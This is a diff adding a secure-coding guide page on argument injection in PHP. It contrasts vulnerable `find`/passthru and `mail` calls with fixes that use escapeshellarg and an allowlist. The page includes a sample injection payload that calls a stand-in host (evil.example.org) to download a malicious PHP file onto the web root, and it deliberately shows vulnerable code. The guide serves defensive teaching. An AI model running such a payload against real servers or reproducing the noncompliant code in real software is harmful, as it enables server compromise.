@@ -1,0 +1,82 @@
+=== How to fix it in Core PHP
+
+The following code uses the `find` command and expects the user to enter the
+name of a file to find on the system.
+
+It is vulnerable to argument injection because untrusted user-submitted data is
+inserted in the arguments of a process call without prior validation or
+sanitization. +
+Here, the application ignores that a user-submitted parameter might contain
+special characters that will tamper with the expected system command behavior.
+
+In this particular case, an attacker might add arbitrary arguments to the `find`
+command for malicious purposes. For example, the following payload will download
+malicious software on the application's hosting server.
+
+----
+* -exec curl -o /var/www/html/ http://evil.example.org/malicious.php ;
+----
+
+Other standard PHP functions are susceptible to the same vulnerable behavior.
+Especially, the `mail` function accepts, as its fifth argument, parameters that
+will be appended to the configured mail-sending program command line. This might
+lead to a similar exploitation scenario.
+
+==== Non-compliant code example
+
+[source,php,diff-id=1,diff-type=noncompliant]
+----
+$arg=$_GET['file'];
+echo "<h1>File search results:</h1><br/>";
+$cmd=escapeshellcmd('find /tmp/images -iname ' . $arg);
+passthru($cmd);
+----
+
+[source,php,diff-id=2,diff-type=noncompliant]
+----
+$arg=$_GET['arg'];
+echo "<h1>Sending test mail.</h1><br/>";
+mail("mail@example.org", "example subject", "Example", [], $arg);
+----
+
+==== Compliant solution
+
+[source,php,diff-id=1,diff-type=compliant]
+----
+$arg=$_GET['file'];
+echo "<h1>File search results:</h1><br/>";
+$cmd='find /tmp/images -iname ' . escapeshellarg($arg);
+passthru($cmd);
+----
+
+[source,php,diff-id=2,diff-type=compliant]
+----
+$arg=$_GET['arg'];
+echo "<h1>Sending test mail.</h1><br/>";
+
+$allowed_args_mapping = ["-n","-v"];
+if (! in_array($arg, $allowed_args_mapping, true)) {
+	$arg = "";
+}
+mail("mail@example.org", "example subject", "Example", [], $arg);
+----
+
+=== How does this work?
+
+include::../../common/fix/introduction.adoc[]
+
+When building a system command from user-submitted data is unavoidable, using
+the `escapeshellarg` sanitizing function should be preferred. It ensures that
+the provided data will be considered a single argument and prevents the
+injection of subsequent ones.
+
+It is also important not to combine both `escapeshellarg` and `escapeshellcmd`.
+Indeed, a call to `escapeshellcmd` on a complete command line will void any
+escaping previously added with `escapeshellarg`.
+
+Therefore, it is impossible to prevent an argument injection issue in the
+`mail` function with `escapeshellarg`. Indeed, `mail` internally relies on
+`escapeshellcmd` for escaping purposes. In that case, an allowlist of
+explicitly trusted additional arguments should be used.
+
+
